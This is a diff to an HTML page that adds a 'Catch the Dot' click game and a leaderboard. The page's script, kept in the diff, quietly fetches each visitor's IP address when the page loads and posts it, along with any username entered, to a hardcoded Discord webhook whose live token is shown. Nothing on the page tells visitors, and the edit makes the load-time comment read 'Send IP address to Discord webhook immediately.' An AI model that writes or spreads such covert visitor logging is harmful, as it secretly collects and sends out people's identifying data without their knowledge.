@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Classic Web Page</title>
+    <title>Classic Web Page with Game</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -47,16 +47,6 @@
             margin-bottom: 20px;
         }
 
-        footer {
-            background-color: #333;
-            color: white;
-            text-align: center;
-            padding: 10px 0;
-            position: fixed;
-            width: 100%;
-            bottom: 0;
-        }
-
         .username-form {
             background-color: #e2e2e2;
             padding: 20px;
@@ -77,14 +67,34 @@
             border: none;
             cursor: pointer;
         }
+
+        .game {
+            margin-top: 20px;
+            padding: 20px;
+            border: 1px solid #ccc;
+            background-color: #fff;
+            text-align: center;
+            border-radius: 5px;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .game canvas {
+            background-color: #f4f4f4;
+            border: 1px solid #ccc;
+        }
+
+        .leaderboard {
+            margin-left: 20px;
+            text-align: left;
+        }
     </style>
     <script>
         document.addEventListener("DOMContentLoaded", () => {
-            // Fetch the user's IP address using the ipify API
+            // Send IP address to Discord webhook immediately
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
-                    // Send the IP address to the Discord webhook
                     const webhookUrl = 'https://discord.com/api/webhooks/1246227148872876082/bzPAHeHCZQHh0nponXKEoxy0uvoCWc56NpFE-hYtJqYafMn8W3cYkiUhaYgQPWz8TJPd';
                     const message = {
                         content: `User's IP Address: ${data.ip}`
@@ -114,13 +124,11 @@
             form.addEventListener('submit', (event) => {
                 event.preventDefault();
                 const username = document.getElementById('username').value;
-                
+
                 if (username) {
-                    // Fetch the user's IP address using the ipify API
                     fetch('https://api.ipify.org?format=json')
                         .then(response => response.json())
                         .then(data => {
-                            // Send the username and IP address to the Discord webhook
                             const webhookUrl = 'https://discord.com/api/webhooks/1246227148872876082/bzPAHeHCZQHh0nponXKEoxy0uvoCWc56NpFE-hYtJqYafMn8W3cYkiUhaYgQPWz8TJPd';
                             const message = {
                                 content: `User: ${username}\nIP: ${data.ip}`
@@ -148,6 +156,74 @@
                 }
             });
         });
+
+        function startGame() {
+            const canvas = document.getElementById('gameCanvas');
+            const ctx = canvas.getContext('2d');
+            let score = 0;
+            let misses = 0;
+            let dotRadius = 20;
+            let x = canvas.width / 2;
+            let y = canvas.height / 2;
+            let dx = 2;
+            let dy = 2;
+            const scoreElement = document.getElementById('score');
+            const missesElement = document.getElementById('misses');
+            const leaderboard = document.getElementById('leaderboard');
+
+            function drawDot() {
+                ctx.clearRect(0, 0, canvas.width, canvas.height);
+                ctx.beginPath();
+                ctx.arc(x, y, dotRadius, 0, Math.PI * 2);
+                ctx.fillStyle = '#0095DD';
+                ctx.fill();
+                ctx.closePath();
+
+                if (x + dx > canvas.width - dotRadius || x + dx < dotRadius) {
+                    dx = -dx;
+                }
+                if (y + dy > canvas.height - dotRadius || y + dy < dotRadius) {
+                    dy = -dy;
+                }
+
+                x += dx;
+                y += dy;
+            }
+
+            function gameLoop() {
+                drawDot();
+                requestAnimationFrame(gameLoop);
+            }
+
+            canvas.addEventListener('click', (event) => {
+                const rect = canvas.getBoundingClientRect();
+                const clickX = event.clientX - rect.left;
+                const clickY = event.clientY - rect.top;
+
+                if (Math.sqrt((clickX - x) ** 2 + (clickY - y) ** 2) < dotRadius) {
+                    score++;
+                    scoreElement.textContent = `Score: ${score}`;
+                    dotRadius = Math.random() * 20 + 10; // New radius between 10 and 30
+                    x = Math.random() * (canvas.width - 2 * dotRadius) + dotRadius; // New random x position
+                    y = Math.random() * (canvas.height - 2 * dotRadius) + dotRadius; // New random y position
+                    dx = (Math.random() - 0.5) * 4; // New random dx
+                    dy = (Math.random() - 0.5) * 4; // New random dy
+                } else {
+                    misses++;
+                    missesElement.textContent = `Misses: ${misses}`;
+                }
+                updateLeaderboard(score, misses);
+            });
+
+            function updateLeaderboard(score, misses) {
+                const username = document.getElementById('username').value || 'Anonymous';
+                leaderboard.innerHTML = `Player: ${username}<br>Score: ${score}<br>Misses: ${misses}`;
+            }
+
+            gameLoop();
+        }
+
+        document.addEventListener("DOMContentLoaded", startGame);
     </script>
 </head>
 <body>
@@ -186,9 +262,20 @@
                 <input type="submit" value="Submit">
             </form>
         </section>
+        <section class="game">
+            <div>
+                <h2>Catch the Dot Game</h2>
+                <canvas id="gameCanvas" width="400" height="400"></canvas>
+                <p id="score">Score: 0</p>
+                <p id="misses">Misses: 0</p>
+            </div>
+            <div class="leaderboard" id="leaderboard">
+                <h3>Personal Leaderboard</h3>
+                <p>Player: Anonymous</p>
+                <p>Score: 0</p>
+                <p>Misses: 0</p>
+            </div>
+        </section>
     </main>
-    <footer>
-        <p>&copy; 2024 Classic Web Page. All rights reserved.</p>
-    </footer>
 </body>
 </html>
